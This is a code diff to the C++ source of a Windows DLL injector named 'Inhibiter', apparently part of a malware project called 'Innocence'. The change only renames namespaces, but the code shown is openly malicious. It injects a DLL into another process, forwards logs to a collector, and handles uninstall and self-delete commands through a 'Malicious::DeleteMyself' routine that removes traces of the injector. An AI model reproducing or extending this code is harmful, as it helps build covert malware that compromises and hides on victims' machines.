@@ -1,5 +1,5 @@
-#include <Innocence.hpp>
-#include <common/Log.hpp>
+#include <common/Innocence.hpp>
+#include <log/Log.hpp>
 
 #include "Inhibiter.hpp"
 using namespace Inhibiter;
@@ -27,13 +27,13 @@ void Inject(InhibiterCore& injector, const string& inhibitorPath);
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {	
     TRACE_FUNCTION
-    LOG.setIdentity(Innocence::identity);
-	LOG.addObserver(new Common::LogToCollector);
+    LOG.setIdentity(Common::identity);
+	LOG.addObserver(new Log::LogToCollector);
 
 	System::Process::This thisProcess;
     InhibiterCore injector (thisProcess.getProgramPath());
     LOG << "Program path : " + thisProcess.getProgramPath();
-    LOG << "Arguments count : " + toString(thisProcess.getArgCount());
+    LOG << "Arguments count : " + Common::toString(thisProcess.getArgCount());
 	
     // l'injecteur a plusieurs utilités en plus d'injecter bêtement
     // la dll dans un processus, il va servir aussi a exécuter
@@ -58,14 +58,14 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 void ExecuteCommand(InhibiterCore& injector, const string& command)
 {
     TRACE_FUNCTION
-	if(command == Innocence::UNINSTALL_CMD)
+	if(command == Common::UNINSTALL_CMD)
     {
 		LOG << "Uninstall command";
         Sleep(1000);
         injector.uninstall();
-        Malicious::DeleteMyself(Innocence::INHIBITER_EXE_NAME, Innocence::SELF_DELETE_CMD);
+        Malicious::DeleteMyself(Common::INHIBITER_EXE_NAME, Common::SELF_DELETE_CMD);
     }
-    else if(command == Innocence::SELF_DELETE_CMD)
+    else if(command == Common::SELF_DELETE_CMD)
     {
         LOG << "Self delete command";
         Sleep(500);
@@ -79,7 +79,7 @@ void ExecuteCommand(InhibiterCore& injector, const string& command)
 		LOG << "Deleting old injector : " + command;
         if(!DeleteFile(command.c_str()))
         {
-			LOG << "DeleteFile failed : " + toString(GetLastError());
+			LOG << "DeleteFile failed : " + Common::toString(GetLastError());
             FATAL_ERROR("Unable to delete old injector");
         }
         else
